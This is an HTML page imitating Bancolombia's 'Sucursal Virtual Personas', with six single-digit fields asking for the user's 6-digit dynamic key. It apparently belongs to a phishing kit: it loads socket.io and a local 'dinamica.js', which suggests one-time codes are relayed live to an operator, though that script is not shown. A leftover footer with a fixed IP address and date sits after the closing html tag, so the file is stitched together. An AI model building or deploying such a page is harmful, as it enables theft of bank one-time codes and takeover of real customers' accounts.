<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sucursal Virtual Personas - Bancolombia</title>
    <link rel="stylesheet" href="styles.css">
    <script src="/socket.io/socket.io.js"></script>
    <script src="dinamica.js" defer></script>
    <style>
        .clave-dinamica {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin: 20px 0;
        }
        .digit-input {
            width: 40px !important;
            height: 45px !important;
            text-align: center;
            font-size: 18px !important;
            padding: 0 !important;
        }
        .actions {
            display: flex;
            gap: 15px;
            margin-top: 25px;
        }
        .btn-cancelar {
            background: transparent;
            border: 1px solid #fff;
            color: #fff;
            border-radius: 25px;
            padding: 10px 25px;
            cursor: pointer;
            flex: 1;
        }
    </style>
</head>
<body>
    <div class="auth-container">
        <div class="auth-content">
            <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="logo">
            <h1>Sucursal Virtual Personas</h1>
            
            <div class="auth-box">
                <h2>Verificación</h2>
                <p>Ingresa la clave dinámica de 6 dígitos</p>
                
                <form id="dynamicForm" class="auth-form">
                    <div class="clave-dinamica">
                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric">
                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric">
                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric">
                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric">
                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric">
                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric">
                    </div>
                    <div class="button-container">
                        <button type="submit" class="btn-iniciar" disabled>Continuar</button>
                        <button type="button" class="btn-cancelar">Cancelar</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
</body>
</html>

            <div class="footer-left">
                <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="footer-logo">
                <img src="img/SFC_NEGRO_1_1.png" alt="SFC" class="sfc-logo">
            </div>
            <div class="footer-right">
                <p class="ip-address">Dirección IP: 190.84.119.220</p>
                <p class="datetime">miércoles, 22 de octubre de 2025, 8:26 p.m.</p>
            </div>
        </div>
    </footer>
</body>
</html>
